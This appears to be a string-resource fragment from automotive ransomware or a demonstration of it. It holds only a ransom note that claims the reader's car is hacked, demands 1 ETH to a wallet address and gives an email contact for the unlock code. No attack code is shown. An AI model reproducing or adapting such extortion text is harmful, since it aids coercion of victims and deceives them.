resources.string: Sorry, your car has been hacked! Follow the instructions below if you want to regain control of your car
Oops, your car has been hacked, pay the ransom to unlock it!
Transfer 1 ETH into 0x43958653f34a0ee798f6801722aed903c6dd7fe9 and mail the transaction hash and the below text to payransom@protonmail.com to get the unlock code.
